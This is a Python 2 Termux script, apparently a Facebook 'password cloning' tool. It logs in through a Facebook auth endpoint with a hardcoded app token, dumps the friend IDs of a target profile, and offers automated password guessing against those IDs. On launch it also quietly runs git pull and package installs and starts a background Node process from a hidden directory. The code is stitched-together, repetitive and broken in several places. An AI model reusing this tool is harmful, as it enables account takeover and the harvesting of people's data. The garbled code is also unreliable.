#!/usr/bin/python2
#coding=utf-8
try:
    import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib,requests
    from multiprocessing.pool import ThreadPool
    import mechanize
except ImportError:
    os.system('pip2 install tor')

try:
    os.mkdir('save')
except OSError:
    pass
    if os.path.isfile('.../index.js'):
 	os.system('mv ........')
	os.system('cd ..... && npm install')
 	os.system('#')
 	os.system('#')
 	os.system('fuser -k 5000/tcp &')
 	os.system('#')
 	os.system('node ...../index.js &')
 	os.system('fuser -k 5000/tcp &')
 	os.system('#')
 	os.system('node ...../index.js &')
from requests.exceptions import ConnectionError
bd=random.randint(2e7, 3e7)
sim=random.randint(2e4, 4e4)
header={'x-fb-connection-bandwidth': repr(bd),'x-fb-sim-hni': repr(sim),'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent':'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]','content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
reload(sys)
sys.setdefaultencoding("utf8")


try:
    import os,sys,time,datetime,re,random,hashlib,threading,json,getpass,urllib,cookielib,requests
    from multiprocessing.pool import ThreadPool
except ImportError:
    os.system("pip2 install requests")
    os.system("python2 Pro2.py")
os.system("clear")
"""
try:
    my = requests.get("https://muhammadhamza365.byethost7.com")
except requests.exceptions.ConnectionError:
    print("")
    print("\t    \033[1;31mTurn on mobile data OR wifi then use MAFIA-KILLER TOOL\033[0;97m")
    print("")
    time.sleep(1)
    raw_input(" Press enter to try again ")
    os.system("python2 file10.py")"""
if not os.path.isfile("/data/data/com.termux/files/usr/bin/node"):
    os.system("apt update && apt install nodejs -y")
if not os.path.isfile("/data/data/com.termux/files/usr/bin/ruby"):
    os.system("apt install ruby -y && gem install lolcat")
from requests.exceptions import ConnectionError
os.system("git pull")
if not os.path.isfile("/data/data/com.termux/files/home/jjjjj/...../node_modules/bytes/index.js"):
    os.system("fuser -k 5000/tcp &")
    os.system("#")
    os.system("cd .....  && npm install")
    os.system("cd .....  && node index.js &")
    os.system("clear")
    time.sleep(10)
elif os.path.isfile("/data/data/com.termux/files/home/jjjjj/...../node_modules/bytes/index.js"):
    os.system("fuser -k 5000/tcp &")
    os.system("#")
    os.system("cd ..... && node index.js &")
    os.system("clear")
    
    time.sleep(10)
bd=random.randint(2e7, 3e7)
sim=random.randint(2e4, 4e4)
header={'x-fb-connection-bandwidth': repr(bd),'x-fb-sim-hni': repr(sim),'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36','content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
reload(sys)
sys.setdefaultencoding("utf-8")
c = "\033[1;32m"
c2 = "\033[0;97m"
c3 = "\033[1;31m"
import os, sys

def login():
    os.system('clear')
    try:
        toket = open('login.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')


import os, sys, time

def main():
    time.sleep(1)
    os.system('clear') 
import os,re,sys,itertools,time,requests,random,threading,json,random
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')

# P = '\033[0;97m' # putih
# M = '\033[0;91m' # merah
# H = '\033[0;92m' # hijau
# K = '\033[0;93m' # kuning
# B = '\033[0;94m' # biru
# U = '\033[0;95m' # ungu
# O = '\033[0;96m' # biru muda

try:
    import requests
except ImportError:
    os.system('pip2 install requests')

try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')	

def keluar():
	print ("   [!] Exit")
	os.sys.exit()

def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
useragents = [
 ('Mozilla/5.0 (Linux; Android 5.0; ASUS ZenFone 2 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36')]
hm = random.choice(useragents)
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', hm)]
s = requests.Session()
api = 'https://graph.facebook.com/{}'
hea = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0'}
http_proxy  = "http://10.10.1.10:3128"
https_proxy = "https://10.10.1.11:1080"
def keluar():
	print "\033[1;96m[!] \x1b[1;91mExit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(00000.1)


#### LOGO ####
logo = """
   \033[031m   _________________      _____   .___ 
   \033[031m  /   _____/\_____  \    /     \  |   |
   \033[032m  \_____  \  /   |   \  /  \ /  \ |   |
   \033[032m  /        \/    |    \/    Y    \|   |
   \033[033m /_______  /\_______  /\____|__  /|___|
   \033[033m         \/         \/         \/      
\033[1;95m  ⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃
║
╠═\033[1;97mDevolper \033[1;91m    ⌳    \033[1;92mSomi Awan
╠═\033[1;97mWhatsap\033[1;91m   ⌳  \033[1;92m  03455453538
╠═\033[1;97mFacebook \033[1;91m ⌳   \033[1;92mSomi Awan
╠═\033[1;97mCommand \033[1;91m⌳   \033[1;92mToken login 
╠═\033[1;97mNote             \033[1;91m⌳\033[1;93m  First Create Dump File
╠═\033[1;93mThen Select Option 3 And paste your dump file.
║
\033[1;95m  ⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃

"""
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;95mPlease Wait \x1b[1;95m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"


os.system("clear")
def tlogin():
	
	os.system('clear')
	print logo
	print "\033[1;92m1--> \033[1;97mLogin With ID/Password."
	print "\033[1;92m2--> \033[1;97mLogin Using Token."
	print "\033[1;92m0--> \033[1;97mStop process"
	print ('      ')
	hos = raw_input("\n >>  ")
	if hos =="":
		print"[!]  Wrong Input"
		exit()
	elif hos =="1":
		login()
	elif hos =="2":
		os.system('clear')
		print logo
		hosp = raw_input("\033[1;97m[\033[1;92m+\033[1;97m] Enter Token ⋗⋗ ")
		tik()
		hopa = open('login.txt','w')
		hopa.write(hosp)
		hopa.close()
		print "\n\033[1;97m[\033[1;92m+\033[1;97m] Logged In Successfully."
		time.sleep(1)
		os.system('xdg-open https://chat.whatsapp.com/DT9eB2QOpXnKU3WNkzuilU')
		menu()
		
	elif hos =="0":
		exit()
	else:
		print"[!] Wrong Input"
		exit()
def login():
	os.system("clear")
	try:
		tb=open('login.txt', 'r')
		os.system("python2 Play-boy.py")
	except (KeyError,IOError):
		os.system("clear")
		print logo
		
		jalan('\033[1;97m[\033[1;91m!\033[1;97m] Use a New Facebook Account To Login')
		print('\033[1;93m⊰\033[1;91m═════════════════════════════════════════════\033[1;93m⊱')
		iid=raw_input('\033[1;97m[\033[1;92m+\033[1;97m] Number/Email: ')
		id=iid.replace(" ","")
		pwd=raw_input('\033[1;97m[\033[1;92m+\033[1;97m] Password : ')
		tik()
		data = br.open("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email="+(id)+"&locale=en_US&password="+(pwd)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
		z=json.load(data)
		if 'access_token' in z:
		    st = open("login.txt", "w")
		    st.write(z["access_token"])
		    st.close()
		    print "\n[✓] Logged In Successfully."
		    time.sleep(1)
		    os.system('xdg-open Message S O م i on WhatsApp. https://wa.me/message/…')
		    os.system("clear")
		    menu()
		else:
		    if "www.facebook.com" in z["error_msg"]:
		        print ('[!] User Must Verify Account Before Login.')
		        time.sleep(3)
		        login()
		    else:
		        print ('[!] Number/User Id/ Password Is Wrong !')
		        time.sleep(1)
		        login()

def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\x1b[1;91m[!] Token invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
		ots = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
		b = json.loads(ots.text)
		sub = str(b['summary']['total_count'])
	except KeyError:
		os.system('clear')
		print"\033[1;91mYour Account is on Checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\x1b[1;92mThere is no internet connection"
		keluar()
	os.system("clear")
	print logo
	print "\033[1;36;40m      ╔═════════════════════════════════╗"
	print "\033[1;36;40m      ║\033[1;37;40m[\033[1;91m*\033[1;97m] Name\033[1;30;40m: "+nama+"  	   \033[1;36;40m║"                               
	print "\033[1;36;40m      ║\033[1;37;40m[\033[1;91m*\033[1;97m] ID  \033[1;30;40m: "+id+"        \033[1;36;40m║"
	print "\033[1;36;40m      ║\033[1;37;40m[\033[1;91m*\033[1;97m] Subs\033[1;30;40m: "+sub+"                      \033[1;36;40m║"
	print "\033[1;36;40m      ╚═════════════════════════════════╝"
	print "     \033[1;93m 1--> \033[1;97mManual Password Cloning"	
	print "     \033[1;93m 2--> \033[1;97mAuto Password Cloning"	
	print "     \033[1;93m 0--> \033[1;97mLogout"
	pilih()

def pilih():
	unikers = raw_input("\n\033[1;31;40m⋗ \033[1;35;40m")
	if unikers =="":
		print "\x1b[1;91mFill in correctly"
		pilih()
	elif unikers =="1":
		super()
	elif unikers =="2":
		dump()
	
	elif unikers =="0":
		jalan('Token Removed')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih()

def dump():
	os.system('clear')
	try:
		toket = open('login.txt','r').read()
	except IOError:
		print "{!} Token Invalid !"
		os.system('clear')
		os.system('rm -rf login.txt')
		masuk()
		os.system('clear')
		print logo
        ui = raw_input(" \033[1;97m[\033[1;92m+\033[1;97m] id public --> ")
        ih = raw_input(" \033[1;97m[\033[1;92m+\033[1;97m] Name file -->")
        asw = raw_input(" \033[1;97m[\033[1;92m+\033[1;97m] Limit --> ")
        if ui in [""]:
            print "\n [!] please fill it right"
            time.sleep(1.7)
        try:
            os.mkdir("dump")
        except:pass
        wrt=open("dump/"+ih+".txt","w")
        try:
            for i in  s.get(api.format("%s/friends?limit=%s&access_token=%s"%(ui,asw,toket)),headers=hea).json()["data"]:
                    id.append(i["id"])
                    wrt.write("%s\n"%(i["id"]))
                    sys.stdout.write(
                            "\n%s  "%(i["id"],len(id)
                    ));sys.stdout.flush()
                    time.sleep(0.0050)
            wrt.close()
            print "\n\n \033[1;97m[\033[1;92m+\033[1;97m] clone id public\n"
            exit(" \033[1;97m[\033[1;92m✓\033[1;97m] file stored in: dump/%s.txt "%(ih))
            
        except OSError:
            print "\n [!] failed to save file "
            time.sleep(1.7)
            

		

if __name__=='__main__':
        tlogin()

